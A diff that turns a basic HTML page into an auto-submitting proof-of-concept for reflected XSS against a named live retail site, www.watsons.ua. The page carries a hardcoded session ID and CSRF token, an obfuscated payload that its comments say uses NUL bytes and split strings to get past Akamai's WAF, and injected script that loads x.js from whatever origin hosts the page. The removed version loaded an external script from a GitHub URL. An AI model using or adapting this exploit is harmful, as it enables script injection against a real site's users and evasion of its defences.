@@ -1,14 +1,33 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Basic Page</title>
-</head>
-<body>
-    <h1>Welcome to My Page</h1>
-    <p>This is a basic HTML page.</p>
-    
-    <script src="https://github.com/Yarterss/Scripts/blob/main/p.js"></script>
-</body>
-</html>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>FND-014 PoC</title></head>
+<body style="font:14px system-ui,sans-serif;margin:40px;color:#333">
+
+<h3>FND-014 — unauthenticated reflected XSS on www.watsons.ua</h3>
+<p>Submitting a cross-origin POST to <code>www.watsons.ua</code>…</p>
+<p><b>Open this in a browser with no existing watsons.ua cookie</b> (fresh private window).
+If you land on <code>/uk/pageNotFound</code>, a cookie conflict rejected the URL session — not a fix.</p>
+
+<form id="f" method="POST"
+      action="https://www.watsons.ua/uk/stockAnonymousNotification;jsessionid=30F13D15A205E8B0E6276DD2DB774E36.prdwtcuacom12">
+  <input type="hidden" name="_csrf" value="260c5694-9fb1-4dbd-8947-e5684f7abb7f">
+  <input type="hidden" name="varCode" id="v">
+</form>
+
+<script>
+// NUL bytes split Akamai's signature matching; Tomcat strips them before the app renders.
+// 'scr'+'ipt' avoids the edge tag dictionary. The loader pulls x.js from THIS page's own
+// origin, so the PoC works unmodified wherever it is hosted.
+var N = String.fromCharCode(0);
+var SRC = location.origin + '/x.js';
+
+document.getElementById('v').value =
+  'A"' + N + '><details open on' + N + 'toggle="' +
+  's=docu' + N + "ment.createElement('scr'+'ipt');" +
+  "s.src='" + SRC + "';" +
+  'docu' + N + 'ment.body.appendChild(s)">';
+
+document.getElementById('f').submit();
+</script>
+
+</body></html>
